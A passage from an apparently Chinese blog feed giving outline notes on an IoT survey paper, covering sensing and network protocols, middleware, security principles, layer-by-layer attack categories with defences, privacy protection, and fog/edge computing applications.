可以与RFID系统协作以识别和跟踪对象的状态[139]。在RSN中，实现了基于小型RFID的传感设备和RFID读取器，其中RFID读取器充当接收器节点以生成数据并为网络操作提供电源。</li></ul></li></ul></li><li><p>无线传感器网络（WSN）</p><ul><li>WSN可以监视和跟踪设备的状态，并通过多个状态将状态数据传输到控制中心或接收器节点</li><li>因此，无线传感器网络可以被视为现实世界和网络世界之间的进一步桥梁[131]</li><li>WSN具有许多优点，包括可伸缩性，动态重新配置，可靠性，小尺寸，低成本和低能耗。</li></ul></li><li><p>Other：</p><ul><li>条形码，也称为一维代码。将信息存储在多条黑线和白间距中。这些线和间距具有不同的宽度，以线性或一维方向组织，并按特殊的编码规则排列[49]。条形码中包含的信息可以由机器读取，该机器使用红外光束扫描条形码[94</li><li>二维代码通过使用在平面上布置的黑白像素，其中黑色像素代表二进制“ 1”，白色像素代表二进制“ 0” [49]。通过特殊的编码规则，黑白像素可以存储大量信息。与条形码相比，二维码具有信息量高，可靠性高，鲁棒性强等优点</li></ul></li></ul></li><li><p>网络层</p><ul><li><p>IEEE 802.15.4</p><ul><li>目标是专注于低速率无线个人区域网（LR-WPAN），以低能耗，低速率传输和低成本[4]提供个人区域中所有事物的低速率连</li><li> IEEE 802.15.4是许多无线通信技术和协议的基础，例如Zigbee [63]，WirelessHART [59]等</li></ul></li><li><p>6LoWPAN</p><ul><li><p>低功耗无线个人局域网（LoWPAN）由大量低功耗无线通信连接的设备组成</p><ul><li>与其他类型的网络相比，LoWPAN具有许多优势（小数据包大小，低功耗，低带宽等）[124</li></ul></li><li><p>作为一项增强功能，通过组合IPv6和LoWPAN设计了6LoWPAN协议</p></li><li><p>由于6LoWPAN的低成本和低能耗，因此它适用于包含大量低成本设备的物联网。 </p></li><li><p>6LoWPAN具有许多优点，包括与传统体系结构的良好连接性和兼容性，低能耗，即席自组织等</p></li></ul></li><li><p>Zigbee</p><ul><li>Zigbee是一种无线网络技术，用于低能耗的短期通信</li><li>在Zigbee协议中，包括五个层：物理层，MAC层，传输层，网络层和应用程序层[124]</li><li>Zigbee网络的优势包括低能耗，低成本，低数据速率，低复杂性，可靠性和安全性</li><li>Zigbee网络可以支持多种拓扑，包括星形，树形和网状拓扑[13]</li></ul></li><li><p>Z-Wave</p><ul><li>Z-wave是一种短期无线通信技术，具有成本低，能耗低和可靠性高的优点[100</li><li> Z-wave的主要目的是在控制单元和一个或多个终端设备之间提供可靠的传输，并且Z-wave适用于带宽较低的网络。</li><li>Z-wave网络支持动态路由技术，每个从站在其内存中存储一​​个路由列表，该列表由控制器更新[41]。</li></ul></li><li><p>Message Queue Telemetry Transport (MQTT)</p><ul><li>消息队列遥测传输（MQTT）是一种消息传递协议，用于在远程传感器上收集测量数据并将其传输到服务器</li><li>MQTT是一种简单而轻便的协议，并支持低带宽和高延迟的网络。</li><li>MQTT可以在各种平台中实现以将IoT中的事物连接到Internet</li><li>因此MQTT可以用作传感器/执行器和服务器之间的消息传递协议，从而使MQTT在IoT中发挥重要作用</li></ul></li><li><p>Constrained Application Protocol (CoAP)</p><ul><li>约束应用协议（CoAP）是基于REST（表示状态传输）体系结构的消息协议</li><li>由于IoT中的大多数设备都受到资源的限制（例如，小存储和低计算能力）。由于其复杂性，HTTP无法在物联网中使用。为了解决该问题，提出了CoAP修改一些HTTP功能以满足物联网的要求。</li><li>一般来说，CoAP是6LoWPAN协议栈中的应用层协议，旨在使资源受限的设备能够实现RESTful交互</li><li>CoAP支持组通信和推送通知，但不支持广播。资源观察，逐块资源传输，资源发现，与HTTP交互以及安全性都是CoAP提供的重要功能</li></ul></li><li><p>Extensible Messaging and Presence Protocol (XMPP)</p><ul><li><p>可扩展消息和状态协议（XMPP）是基于XML流协议的即时消息协议</p></li><li><p>XMPP继承了XML协议的功能，因此XMPP具有出色的可伸缩性，寻址和安全性，可用于多方聊天，语音和视频流以及远程呈现</p></li><li><p>在XMPP中，包括以下三个角色：客户端，服务器和网关，并且在这三个角色的两方之间支持双向通信。</p><ul><li>服务器可以实现链接管理和消息路由的功能</li><li>网关用于支持异构系统之间的稳定通信</li><li>客户端可以基于TCP / IP协议连接到服务器并基于XML流传输上下文协议</li></ul></li><li><p>因此，XMPP可以在物联网中使用，以支持与基于XML的文本消息进行对象到对象的通信</p></li></ul></li><li><p>Data Distribution Service (DDS)</p><ul><li>数据分发服务（DDS）是一种发布/订阅协议，用于支持高性能的设备到设备通信[7</li><li>它是一个以数据为中心的协议，其中可以支持多播以实现高质量的服务和高可靠性</li><li>无需代理的发布/订阅架构使DDS适用于实时受限的IoT和设备到设备通信</li><li>此外，DDS可以实现出色的可伸缩性。</li></ul></li><li><p>Advanced Message Queuing Protocol (AMQP)</p><ul><li>先进的消息队列协议（AMQP）是一种开放标准的消息队列协议，用于在应用程序层[7]，[40]中提供消息服务（队列，路由，安全性和可靠性等）</li><li>AMQP专注于面向消息的环境，可以视为面向消息的中间件协议</li><li>使用AMQP，即使这些客户端和中间件是由不同的编程语言生成的，客户端也可以与消息中间件实现稳定的通信</li><li>此外，AMQP实现了各种消息交换体系结构，包括存储和转发，发布和订阅，消息分发，消息队列，基于上下文的路由以及点对点路由</li></ul></li><li><p>Others</p><ul><li>多播DNS（mDNS）可以支持IoT应用程序中的名称解析[7]，[55]。客户端可以使用DNS服务发现（DNS-SD）通过mDNS [7]，[30]在特殊网络中发现所需的服务</li><li>Routing protocol for Low Power and Lossy networks is低功耗有损网络的路由协议是与链路无关的路由协议，可以将其部署在资源受限的节点上，以确定低功耗和有损链路上的路由</li></ul></li></ul></li><li><p>服务层</p><ul><li><p>接口技术</p><ul><li>必须在服务层中设计接口技术，以确保在设备和应用程序之间进行有效而安全的信息交换</li><li>此外，该接口应有效管理互连的设备，包括设备连接，设备断开连接，设备通信和设备操作[137</li><li>需要一个InterFace Profile（IFP）可以被认为是一种服务标准，可以用来促进各种设备或应用程序提供的服务之间的交互</li><li>尽管已经为物联网开发了许多接口技术，但以低成本实现更有效，安全和可扩展的接口技术仍然是支持物联网的未来研究面临的巨大挑战</li></ul></li><li><p>服务管理技术</p><ul><li><p>服务管理可以有效地主动发现设备和应用程序，并安排高效，可靠的服务以满足要求。</p></li><li><p>服务可以被认为是一种行为，包括数据的收集，交换和存储，或这些行为的关联，以实现特殊的目标</p></li><li><p>服务可以在物联网中分为两类：主要服务和辅助服务</p><ul><li>基本服务，也称为基本服务，可以在设备或应用程序中公开主要功能。</li><li>辅助服务可以基于主要服务或其他辅助服务来实现辅助功能</li></ul></li><li><p>隐藏服务的实现细节并使这些服务可以在异构设备和应用程序中兼容实现，因此SoA已用于集成服务。</p><ul><li>部署基于SoA的服务，应首先开发服务组合平台</li><li>然后抽象设备的功能和通信能力</li><li>最后，应提供一套通用的服务</li></ul></li></ul></li><li><p>中间件技术</p><ul><li><p>中间件是一种软件或服务程序，可以提供介于物联网技术和应用程序之间的抽象</p></li><li><p>在中间件中，隐藏了不同技术的细节，并且提供了标准接口，使开发人员可以专注于应用程序的开发，而无需考虑应用程序与基础架构之间的兼容性</p></li><li><p>因此，通过使用中间件，具有不同接口的设备和应用程序可以交换信息并彼此共享资源</p></li><li><p>中间件具有以下优点</p><ul><li>（i）中间件可以支持各种应用程序；</li><li>（ii）中间件可以在各种操作系统和平台上运行；</li><li>（iii）中间件可以支持异构网络，设备和应用程序之间的分布式计算和服务交互；</li><li>（iv）中间件可以支持标准</li><li>（v）中间件可以提供标准接口，提供可移植性和标准协议以实现互操作性，并使中间件在标准化中发挥重要作用[25]。</li><li>中间件还可以为应用程序提供稳定的高级接口。通过稳定的接口，应用程序可以在硬件和操作系统上独立运行。此功能使中间件适用于IoT，因为已集成了大量异构设备和网络，并且这些设备和网络将经常更改或更新。</li></ul></li><li><p>中间件的许多研究工作已经完成开发，可以分为五类</p><ul><li><p>（i）面向消息的中间件</p><ul><li>面向消息的中间件可以在各种平台和通信协议（例如AMQP，DDS，MQTT和XMPP）之间提供可靠的信息交换</li></ul></li><li><p>（ii）基于语义Web的中间件</p><ul><li>基于语义的Web中间件可以提供各种传感器网络之间的交互作用和互操作性。此类示例包括基于SoA的中间件[119]，基于任务计算的中间件[43]等</li></ul></li><li><p>（iii）基于位置的服务和监视中间件</p><ul><li>基于位置的服务和监视中间件将设备的位置和其他信息集成在一起，以提供集成的价值服务[110]。</li></ul></li><li><p>（iv）通信中间件</p><ul><li>通信中间件可以在异构设备和应用程序之间提供可靠的通信。在通信中间件中，基于RFID的中间件（Fosstrak [2]等），基于传感器网络的中间件（TinyREST [82]等）以及监控和数据采集（SCADA）是典型的示例。</li></ul></li><li><p>（v）普适性中间件</p><ul><li>普适中间件是为普适计算环境设计的，并在多个异构平台上提供服务[93]。</li></ul></li></ul></li><li><p>将中间件集成到物联网中，以下挑战需要解决的问题</p><ul><li>（i）互操作性挑战是在通信和信息交换中连接异构设备</li><li>（ii）可扩展性挑战要在具有以下条件的小规模环境或大规模环境中有效地进行：可能涉及大量对象</li><li>（iii）抽象提供挑战是在各个级别提供抽象</li><li>（iv）自发交互挑战是为自发事件提供可靠的服务</li><li>（v）固定基础结构挑战是在不提供自定义事件的情况下提供可靠的服务</li><li>（vi）多重性挑战是支持设备间的同时通信，并从大量服务中选择或安排最适合设备的服务。</li></ul></li><li><p>物联网中间件应实现信任，安全和隐私</p></li></ul></li><li><p>资源管理和共享技术</p><ul><li><p>各种杂项neous网络已集成，可为物联网中的所有应用程序（智能交通，智能电网等）提供数据传输。</p></li><li><p>为了降低成本，某些应用程序可以共享部分网络资源以提高其利用率。在这种情况下，确保各种应用程序请求的信息按时交付是物联网面临的挑战。</p></li><li><p>现有的资源共享机制主要集中在频谱共享上，频谱共享用于有效地协调同一频率下的多个网络，以最大程度地利用网络资源</p><ul><li>频谱共享可以分为三个维度，包括时间，频率和空间。</li></ul></li><li><p>虽然大多数现有方案都是针对机器对机器或设备对设备通信而开发的，但物联网却专注于物对物网络</p><ul><li>其中“物”不仅指设备或机器，还指人行为和其他对象</li><li>因此，跨异构网络设计一种适用于物联网环境的有效资源共享方案是未来发展的重大挑战。</li></ul></li><li><p>物联网中的原始数据由智能设备收集（RFID，传感器等），以及大多数这些智能设备受资源限制，无法从环境中获取能量。在资源管理中应考虑节能方案</p><ul><li>包括通过从分布式能源中收集能量来延长传感器寿命的方案[21]</li><li>通过占空比方案来降低传感器能量的方案[98]</li><li>基于能量的路由协议以平衡能量消耗并延长传感器网络的寿命[152]，[151]等</li><li>尽管这些努力可以在节能和管理上很好地发挥作用，但适用于IoT的方案由异构网络组成的网络基础设施对于未来的研究也是一个悬而未决的挑战。</li></ul></li></ul></li></ul></li></ul><h3 id="第五节中介绍了物联网的安全和隐私问题"><a href="#第五节中介绍了物联网的安全和隐私问题" class="headerlink" title="第五节中介绍了物联网的安全和隐私问题"></a>第五节中介绍了物联网的安全和隐私问题</h3><ul><li><p>物联网的安全性</p><ul><li><p>机密性</p><ul><li>机密性可以确保数据仅在整个过程中对授权用户可用，并且不能被未授权用户窃听或干扰。</li><li>在物联网中，机密性是重要的安全原则，因为大量测量设备（RFID，传感器等）可以集成在物联网中。</li><li>因此，至关重要的是确保测量设备收集的数据不会向其相邻设备泄露安全信息。</li><li>为实现高度机密性，应开发和使用增强的技术，包括安全密钥管理机制和其他技术[22]</li></ul></li><li><p>完整性</p><ul><li>完整性可以确保在通信网络中的数据传递过程中，数据不会被有意或无意的干扰所篡改，最终为授权用户提供准确的数据。</li><li>完整性对于物联网非常重要，因为如果物联网应用程序接收到伪造数据或篡改数据，则可以估计错误的运行状态并做出错误的反馈命令，这可能会进一步破坏物联网应用程序的运行。</li><li>为了实现可接受的完整性，应开发并应用增强的安全数据完整性机制（错误的数据过滤方案等）[144]。</li></ul></li><li><p>可用性</p><ul><li>可用性可以确保数据和只要需要数据和设备，设备就可用于授权用户和服务。</li><li>在物联网中，通常以实时方式请求服务，并且如果无法及时交付所请求的数据，则无法计划和提供服务。因此，可用性也是重要的安全原则。</li><li>对可用性的最严重威胁之一是拒绝服务（DoS）攻击，应研究并应用增强技术（安全，高效的路由协议等）以确保IoT的可用性[83]。</li></ul></li><li><p>身份验证</p><ul><li>身份验证可以确保无法将未经授权的设备或应用程序连接到IoT，并且身份验证可以确保网络中传递的数据是合法的，并且请求数据的设备或应用程序也是合法的。</li><li>在物联网中，很难识别和验证每个数据和对象，因为物联网包含大量不同的对象。</li><li>因此，设计有效的机制来处理对象或事物的身份验证在物联网中至关重要[32]。</li></ul></li><li><p>隐私</p><ul><li>隐私可以确保数据只能由相应的用户控制，并且没有其他用户可以访问或处理数据。</li><li>不同于旨在对数据进行加密而不会被未授权用户窃听和干预的机密性，隐私可确保用户只能基于接收到的数据进行某些特定控制，而不能从接收到的数据中推断出其他有价值的信息</li><li>由于大量设备，服务和人们在IoT中共享同一通信网络，因此隐私被视为重要的安全原则之一。</li></ul></li><li><p>信任</p><ul><li><p>信任可以确保上述安全性不同对象，不同物联网层和不同应用程序之间的交互过程中要实现的隐私和隐私目标。</p></li><li><p>物联网的信任目标</p><ul><li>每个物联网层之间的信任</li><li>设备之间的信任</li><li>设备和应用程序之间的信任</li></ul></li><li><p>有了信任，就可以实施安全性和隐私权。信任管理系统应设计为在物联网中实现这些信任目标。</p></li></ul></li></ul></li><li><p>物联网架构各层中的安全挑战</p><ul><li><p>感知层</p><ul><li><p>1.节点捕获攻击</p><ul><li>在节点捕获攻击中，攻击者可以通过物理上替换整个节点或篡改节点或设备的硬件来捕获和控制IoT中的节点或设备[163]</li><li>如果节点受到节点捕获攻击的威胁，则重要信息（组通信密钥，单选密钥，匹配密钥等）可能会暴露给对手</li><li>攻击者还可以将与捕获的节点关联的重要信息复制到恶意节点，然后将恶意节点伪造为授权节点以连接到IoT网络或系统。将该攻击称为节点复制攻击。</li><li>节点捕获攻击可能会对网络造成严重影响。为了防御节点捕获攻击，需要研究有效的方案来监视和检测恶意节点[15]。</li></ul></li><li><p>2.恶意代码注入攻击</p><ul><li>除通过恶意攻击捕获节点外，攻击者可以通过将恶意代码注入节点或设备的内存中来控制物联网中的节点或设备，这被称为恶意代码注入攻击[143]。</li><li>注入的恶意代码不仅可以执行特定功能，而且还可以授予对手进入IoT系统的权限，甚至可以完全控制IoT系统。</li><li>为了抵御恶意代码注入攻击，需要设计有效的代码身份验证方案并将其集成到IoT [143]，[115]。</li></ul></li><li><p>3.错误的数据注入攻击</p><ul><li>使用捕获的节点攻击者可以注入虚假数据来代替由捕获的节点或设备测得的正常数据，并将虚假数据传输到物联网应用程序[144]。</li><li>物联网应用收到虚假数据后，会返回错误的反馈命令或提供错误的服务，进一步影响物联网应用和网络的有效性。</li><li>为了抵御这种恶意攻击，需要设计可以在IoT应用程序接收数据之前有效检测并删除错误数据的技术（错误数据过滤方案等）[72]，[71]。 </li></ul></li><li><p>4.重播攻击（或新鲜度攻击）</p><ul><li>在物联网中，攻击者可以使用恶意节点或设备将合法标识信息传输到目标主机，该合法标识信息已由目标主机接收，以便使恶意节点或设备获得物联网的信任[90]，[163]。</li><li>重播攻击通常在身份验证过程中发起，以破坏证书的有效性。</li><li>为了减轻重放攻击，应在物联网中设计和开发技术（安全时间戳方案等）</li></ul></li><li><p>5.密码分析攻击和侧信道攻击</p><ul><li>密码分析攻击可以使用获得的密文或明文来推断加密算法中使用的加密密钥[158]。</li><li>但是，密码分析攻击的效率很低。为了提高效率，对手可以引入新的攻击，即边路攻击。</li><li>在物联网[138]中调查的边信道攻击中，对手可以在物联网的加密设备上部署一些技术以获得加密密钥，该密钥在物联网中用于加密数据和解密数据。</li><li>定时攻击是一种典型的旁信道攻击，在这种攻击中，对手可以通过分析执行加密算法所需的时间信息来获取加密密钥。</li><li>为了减轻侧信道攻击，需要在物联网中开发有效且安全的加密算法和密钥管理方案[22]。</li></ul></li><li><p>6.窃听和干扰</p><ul><li>因为大多数物联网中的犯罪分子将通过无线网络进行通信，其脆弱性在于无线链接中传递的信息可能会被未经授权的用户窃听[164]，[42]</li><li>为了处理窃听，需要安全的加密算法和密钥管理方案。</li><li>对手还可以发送噪声数据或信号，以干扰无线链路中传递的信息。</li><li>为了确保数据的准确性和及时性，需要有效的安全噪声过滤方案来过滤噪声数据并恢复原始数据[91]。</li></ul></li><li><p>7.睡眠剥夺攻击</p><ul><li>在物联网中，大多数设备或节点具有低功耗能力。为了延长设备和节点的生命周期，对设备或节点进行编程以遵循睡眠例程以减少功耗</li><li>但是，睡眠剥夺攻击可能会破坏已编程的睡眠例程，并使设备或节点一直处于唤醒状态，直到它们被关闭。</li><li>为了延长这些设备和节点的生命周期，能量收集方案可以是一种可能的解决方案，其中设备和节点可以从外部环境（太阳能等[21]）中收集能量。</li><li>此外，还需要在物联网中研究其他技术，例如缓解占空比剥夺攻击的安全占空比机制。 </li></ul></li></ul></li><li><p>网络层</p><ul><li><p>1.拒绝服务（DoS）攻击</p><ul><li>DoS攻击可以通过攻击网络协议或用大量流量轰炸IoT网络来总结IoT中的所有可用资源，从而使IoT系统的服务不可用[84]。</li><li>DoS攻击被认为是最常见的攻击之一，代表了一种攻击类别，可能导致IoT系统的服务不可用。</li><li>攻击可以通过包括死亡Ping，TearDrop，UDP泛洪，SYN泛洪，陆地攻击等在内的攻击方案来产生</li><li>为了防御DoS攻击，首先需要仔细研究攻击方案，然后再研究有效的防御方案以减轻威胁需要开发攻击来保护物联网系统[83]。</li></ul></li><li><p>2.欺骗攻击</p><ul><li><p>欺骗攻击的目的是使对手获得对物联网系统的完全访问权，并将恶意数据发送到系统中[8]。</p></li><li><p>在物联网中，欺骗攻击的示例包括IP欺骗[92]，RFID欺骗[89]等。</p><ul><li>在IP欺骗攻击中，攻击者可以欺骗并记录IoT中其他授权设备的有效IP地址，然后访问物联网系统使用获取的有效IP地址发送恶意数据，使恶意数据看起来有效。</li><li>在RFID欺骗攻击中，对手可以欺骗并记录有效RFID标签的信息，然后将具有此有效标签ID的恶意数据发送到IoT系统。</li></ul></li><li><p>安全的信任管理，标识和身份验证可能是防御欺骗攻击的可能解决方案[32]，[28]。</p></li></ul></li><li><p>3.槽洞攻击（Sinkhole Attacks）</p><ul><li>在槽洞攻击中，设备或节点要求具有强大的功能，计算和通信功能，因此，由于其吸引力，更多相邻的设备或节点将在数据路由过程中选择受损的设备或节点作为转发节点[118]</li><li>通过这样做，受感染的设备或节点可以增加在IoT系统中传输数据之前获得的数据量。</li><li>请注意，漏洞攻击不仅可以破坏所传递数据的机密性，而且可以成为发起其他攻击（DoS攻击等）的基本步骤。</li><li>为了槽洞攻击，需要研究和应用诸如安全多个路由协议之类的技术[57]</li></ul></li><li><p>4.虫洞攻击（Wormhole Attacks）</p><ul><li><p>可以发起虫洞攻击物联网中的两个协作恶意设备或节点，其中位于不同位置的两个恶意设备可以与专用链路交换路由信息，以实现它们之间的虚假一跳传输，即使它们彼此之间的距离很远[67] 。</p></li><li><p>在蠕虫攻击中，由于减少了转发跳数，因此将通过这两个恶意设备或节点传递更多数据。通过访问更多传递的数据，虫洞攻击可导致与污水坑攻击类似的破坏。</p></li><li><p>为了抵御虫洞攻击，有一些可能的防御技术。</p><ul><li>一种技术是修改路由协议以增强路由选择过程中的安全性[26]，</li><li>而其他技术则涉及部署安全硬件（GPS，定向天线等）。</li></ul></li></ul></li><li><p>5.中间人攻击</p><ul><li>在中间人攻击中，由对手控制的恶意设备可以虚拟地定位在物联网中的两个通信设备之间[97]。通过窃取两个正常设备的标识信息，恶意设备可以成为存储和转发在这两个正常设备之间通信的所有数据的中间设备，而两个正常设备无法检测到恶意设备的存在，并且而是相信他们直接相互交流。</li><li>遭受中间攻击的人可能侵犯机密性，完整性和隐私性通过监视，窃听，篡改和控制两个普通设备之间的通信来控制物联网中受限制的数据。</li><li>与需要物理篡改设备硬件的恶意节点捕获攻击不同，可以仅依靠物联网网络中使用的通信协议来发动中间攻击。</li><li>安全的通信协议和密钥管理方案可以确保正常设备的标识和密钥信息不泄露给对手，可以作为一种有效的防御技术来防御攻击[83]，[22]。</li></ul></li><li><p>6.路由信息攻击</p><ul><li>路由信息攻击着重于物联网系统中的路由协议，其中路由信息可以由对手操纵和发送，以在网络数据传输中创建路由环路，从而导致源路径的扩展和端到端的增加物联网网络的最终延迟[8]</li><li>为了防御路由信息攻击，可以使用安全的路由协议和信任管理来在IoT中的设备之间建立安全链接，并确保标识信息和IP地址不泄漏给对手。</li></ul></li><li><p>7.Sybil（女巫）攻击</p><ul><li>在sybil攻击中，是一种恶意设备，即sybil设备，可以声明多个合法身份并在IoT系统中模拟它们[8]，[96]，[159]。</li><li>由于sybil设备具有多个合法身份，因此sybil设备发送的虚假数据很容易被其良性相邻设备接受。</li><li>同样，选择sybil设备作为转发节点的路由可能会考虑确定了几个不同的相交路径，但实际上，仅确定了一条路径，所有传输的数据都需要通过sybil设备，在其中可以使用干扰和DoS。</li><li>为了抵御sybil攻击，需要为物联网系统开发安全的识别和认证机制[32]。</li></ul></li><li><p>8.未经授权的访问</p><ul><li>RFID是物联网中一项重要的使能技术。但是，由于大量基于RFID的设备已集成在IoT中，并且大多数RFID标签缺乏适当的身份验证机制，因此，RFID标签可以被访问，并且标签中存储的信息可以通过以下方式获取，修改和删除。</li><li>因此，物联网中基于RFID的设备的授权访问和认证机制是需要进一步开发的挑战[56]。</li></ul></li></ul></li><li><p>应用层</p><ul><li><p>1.网络钓鱼攻击</p><ul><li>在网络钓鱼攻击中，攻击者可以通过受感染的电子邮件和网络钓鱼网站欺骗用户的身份验证凭据，从而获得用户的机密数据，例如标识和密码，[8]，[54]。</li><li>安全的授权访问，识别和身份验证可以缓解网络钓鱼攻击[8]。</li><li>尽管如此，最有效的方法是让用户自己在上网时始终保持警惕。</li></ul></li><li><p>2.恶意病毒/蠕虫</p><ul><li>恶意病毒/蠕虫是物联网应用的另一个挑战[8]，[128]，[155]。攻击者可以使用恶意的自我传播攻击（蠕虫，特洛伊木马等）感染IoT应用程序，然后获取或篡改机密数据。</li><li>需要部署可靠的防火墙，病毒检测和其他防御机制来对抗物联网应用程序中的恶意病毒/蠕虫攻击[111]。</li></ul></li><li><p>3.恶意脚本</p><ul><li>恶意脚本代表为损害物联网的系统功能而添加到软件中，在软件中进行修改以及从软件中删除的脚本[8]。</li><li>由于所有物联网应用程序都已连接到Internet，因此在通过Internet请求服务时，对手可以轻松地欺骗客户运行恶意脚本（Java攻击小程序，active-x脚本等）。</li><li>恶意脚本可能造成机密数据的泄漏，甚至导致整个系统关闭。为了防御恶意脚本，需要在IoT系统中部署有效的脚本检测技术，包括蜜罐技术，静态代码检测和动态动作检测。</li></ul></li></ul></li></ul></li><li><p>隐私问题</p><ul><li><p>所有收集和使用的海量数据物联网应经历以下三个步骤</p><ul><li>（i）数据收集</li><li>（ii）数据聚合[130]</li><li>（iii）数据挖掘与分析[126]，[166]。</li></ul></li><li><p>这些步骤中数据的隐私问题也在IoT中引起了。作为物联网的新挑战，隐私可能导致财产损失，甚至危及人类安全[145]，[107]。</p></li><li><p>根据不同的数据处理步骤，隐私保护机制可以分为三类：</p><ul><li><p>（i）数据收集中的隐私保护[65]，</p></li><li><p>（ii）数据聚合中的隐私保护</p><ul><li><p>很难通过传统的加密机制来实现隐私保护</p></li><li><p>（i）基于匿名的隐私保护[105]</p><ul><li>在基于匿名的隐私保护中，在数据聚合过程中使用了几种相关的匿名技术（K匿名，L分集，T紧密度等）来保护标识信息的隐私[106]</li><li>另外，流量分析技术可能会影响匿名通信系统[149]，[76]，</li></ul></li><li><p>（ii）基于加密的隐私保护[39]</p><ul><li>在基于加密的隐私保护中，数种加密技术（同态加密，承诺机制，秘密共享，零知识证明等）被用于数据聚合中，以确保不会被对手窃听数据[39]。</li><li>但是，现有的加密技术只能在数据传输中实现机密性，而在隐私保护方面可能无法很好地发挥作用。</li></ul></li><li><p>（iii）基于干扰的隐私保护</p><ul><li>在基于扰动的隐私保护中，基于扰动的技术（数据定制，数据共享，随机噪声注入等）被用于数据聚合中以扰动原始数据，从而实现了隐私保护[48]</li><li>但是，数据的实用性可能会阻碍该技术在物联网中的应用</li><li>基于干扰的隐私保护方案是物联网中非常流行的技术。但是，大多数基于扰动的隐私保护通过减少数据的实用性来实现出色的性能。效用较低时，数据可能无法或可能仅部分支持IoT应用程序请求的服务</li></ul></li></ul></li><li><p>（iii）数据挖掘和分析中的隐私保护[135]，[20]</p></li></ul></li><li><p>IoT当前在隐私保护方面所做的大部分努力都集中在数据聚合中的数据隐私上</p></li><li><p>具有巨大数据实用性的隐私保护方案的设计仍然是物联网中数据隐私保护方面的巨大挑战，需要进一步研究</p></li></ul></li></ul><h3 id="第六节中介绍了物联网和雾-边缘计算的集成"><a href="#第六节中介绍了物联网和雾-边缘计算的集成" class="headerlink" title="第六节中介绍了物联网和雾/边缘计算的集成"></a>第六节中介绍了物联网和雾/边缘计算的集成</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g893egitkvj30h409q40h.jpg" alt="截屏2019-10-24上午10.42.40"></p><ul><li><p>A.概述</p><ul><li><p>事物产生的信息需要大数据收集和处理所有产生和收集的信息，并将其转化为有用的信息。</p></li><li><p>大数据需要物联网的支持，因为物联网支持的大量传感和激励数据（智能网格，智能交通等）面临挑战。</p></li><li><p>此外，物联网应用中收集的数据通常是非结构化数据，需要进一步分析以提取有用的信息。</p></li><li><p>在物联网中，连续的数据流将影响各种组织中的数据存储容量。将需要其他数据中心来处理从物联网应用程序收集的数据负载。</p><ul><li><p>一种可能的解决方案是通过利用平台即服务（PaaS）将数据移动到云中</p></li><li><p>当组织选择技术用于在执行大数据处理和分析时，需要考虑物联网数据的性质</p></li><li><p>Hadoop和Hive可用于处理大数据。但是，对于IoT应用程序收集的数据，NoSQL文档数据库（Apache CouchDB等）可能是合适的[33]。</p><ul><li>这是因为NoSQL文档数据库可以提供高吞吐量和低延迟</li><li>Apache Kafka是一种用于中间消息代理的物联网工具，可用于实时流处理。大数据的安全性也将受到物联网的影响</li></ul></li></ul></li></ul></li><li><p>B.基于雾/边缘计算的物联网云</p><ul><li><p>在许多IoT / CPS应用程序中，需要有效地存储，处理和分析来自跨越大地理区域的大量事物和对象的数据。为了弥补这一差距，雾/边缘计算能够将云计算扩展到更接近其支持的事物</p></li><li><p>雾/边缘计算可以在网络边缘为设备（节点）提供计算和存储服务，而不是在云中心进行所有计算。</p></li><li><p>雾/边缘计算节点可以是具有以下功能的任何网络设备：具有存储，计算和网络连接（路由器，交换机，视频监控摄像机，服务器等）的功能</p><ul><li>这些设备可以部署在具有网络连接的任何位置，并从IoT收集数据与物联网应用程序关联的设备。</li><li>可以根据性能要求将不同类型的IoT数据定向到适当的位置进行进一步分析。</li><li>可以在最接近生成数据的IoT设备的雾/边缘计算节点上处理需要立即处理的高优先级数据。</li><li>不对延迟敏感的低优先级数据可以定向到某些聚合节点，以进行进一步的处理和分析。</li></ul></li><li><p>将雾/边缘计算与物联网集成存在一些挑战</p><ul><li><p>一个可能的挑战是如何有效地管理雾/边缘计算基础架构并将可用资源分配给物联网设备。</p><ul><li>每次都可以通过IoT设备请求大量服务，并且每个雾/边缘服务节点仅具有有限的计算和存储能力。</li><li>在这种情况下，应该对所有雾/边缘节点进行最佳管理，并为物联网设备（或群集中的一组物联网设备）分配有效的服务</li></ul></li><li><p>另一个挑战是如何有效地管理雾/边缘计算资源</p><ul><li>尽管先前的挑战着重于雾/边缘节点与物联网服务之间的接口，但这一挑战着重于雾/边缘节点之间的资源管理。</li></ul></li><li><p>基于雾/边缘计算的物联网中资源分配的挑战</p><ul><li>终端设备和雾/边缘节点之间的资源分配</li><li>雾/边缘节点之间的资源分配</li></ul></li></ul></li></ul></li></ul><h3 id="第七节-应用-如何在实际应用中实现基于雾-边缘计算的物联网"><a href="#第七节-应用-如何在实际应用中实现基于雾-边缘计算的物联网" class="headerlink" title="第七节 应用  如何在实际应用中实现基于雾/边缘计算的物联网"></a>第七节 应用  如何在实际应用中实现基于雾/边缘计算的物联网</h3><ul><li><p>A.智能电网</p><ul><li>在智能电网中，引入了分布式能源发生器以提高分布式能源的利用率</li><li>引入了电动汽车以提高能量存储能力并减少了CO2的排放</li><li>引入了智能电表和双向通信网络以实现客户与公用事业提供商之间的互动这一目标</li><li>借助雾/边缘计算基础架构，可以存储和处理从智能电表收集的大量数据，从而可以支持智能电网的有效运行。</li><li>利用交互信息，公用事业提供商可以优化电网的能源分配，客户可以优化其能源消耗，从而提高资源利用率并降低成本</li><li>有效的安全机制需要为智能电网开发可在数据收集和传输过程中保持数据隐私性和完整性的工具</li></ul></li><li><p>B.智慧交通</p><ul><li>能交通信息系统（ITS）是另一种典型的基于IoT-CPS的应用，其中集成了智能交通管理，控制系统，通信网络和计算技术，以使交通系统可靠，高效和安全[74]。</li><li>通过对基于雾/边缘计算的IoT基础架构中的车辆网络和雾/边缘计算节点发起恶意攻击，并通过通信与其他车辆共享误导的交通状况数据，对手可能会侵入系统并控制车辆中的ECU在受损车辆[141]，[12]中部署的接口。</li></ul></li><li><p>C.智慧城市</p><ul><li>它旨在通过引入信息和通信技术（ICT）解决方案来管理公共事务[156]。</li><li>智慧城市可以更有效地利用公共资源，从而改善了为用户提供的服务质量，并降低了公共管理者的运营成本[156]，[53]</li><li>物联网/ CPS应用程序，旨在实现城市中公共资源的最佳利用</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（工控向）组态王软件漏洞测试验证与利用</title>
